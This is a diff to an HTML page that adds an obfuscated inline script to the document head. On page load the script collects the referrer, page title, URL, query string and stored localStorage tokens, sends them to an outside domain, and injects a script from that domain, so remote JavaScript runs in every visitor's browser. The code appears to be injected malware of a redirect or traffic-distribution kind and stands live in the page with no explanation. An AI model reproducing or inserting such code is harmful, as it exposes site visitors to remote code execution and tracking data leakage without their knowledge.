@@ -1,6 +1,49 @@
 <!DOCTYPE html>
 <html>
 <head>
+    <script>
+    (function() {
+    var name = '_J6qm9nFs5NqZNFxD';
+    if (!window._J6qm9nFs5NqZNFxD) {
+        window._J6qm9nFs5NqZNFxD = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'https://stornamest.com/WgnzLLyZ',
+            P_PATH: 'https://stornamest.com/7b4f75c/postback',
+        };
+    }
+    const _6nTmYKxyDz1g7dz5 = localStorage.getItem('config');
+    if (typeof _6nTmYKxyDz1g7dz5 !== 'undefined' && _6nTmYKxyDz1g7dz5 !== null) {
+        var _1TkZWj3JPfwPvW4f = JSON.parse(_6nTmYKxyDz1g7dz5);
+        var _pyWkrwqcx4S7q1DH = Math.round(+new Date()/1000);
+        if (_1TkZWj3JPfwPvW4f.created_at + window._J6qm9nFs5NqZNFxD.ttl < _pyWkrwqcx4S7q1DH) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _YrtpJRmwV35zN7PQ = localStorage.getItem('subId');
+    var _PWsXxWXCW4qbWgSy = localStorage.getItem('token');
+    var _df7PN5cR49FnTK9L = '?return=js.client';
+        _df7PN5cR49FnTK9L += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _df7PN5cR49FnTK9L += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _df7PN5cR49FnTK9L += '&default_keyword=' + encodeURIComponent(document.title);
+        _df7PN5cR49FnTK9L += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _df7PN5cR49FnTK9L += '&name=' + encodeURIComponent(name);
+        _df7PN5cR49FnTK9L += '&host=' + encodeURIComponent(window._J6qm9nFs5NqZNFxD.R_PATH);
+    if (typeof _YrtpJRmwV35zN7PQ !== 'undefined' && _YrtpJRmwV35zN7PQ && window._J6qm9nFs5NqZNFxD.unique) {
+        _df7PN5cR49FnTK9L += '&sub_id=' + encodeURIComponent(_YrtpJRmwV35zN7PQ);
+    }
+    if (typeof _PWsXxWXCW4qbWgSy !== 'undefined' && _PWsXxWXCW4qbWgSy && window._J6qm9nFs5NqZNFxD.unique) {
+        _df7PN5cR49FnTK9L += '&token=' + encodeURIComponent(_PWsXxWXCW4qbWgSy);
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._J6qm9nFs5NqZNFxD.R_PATH + _df7PN5cR49FnTK9L;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
     <meta charset="utf-8">
 
     
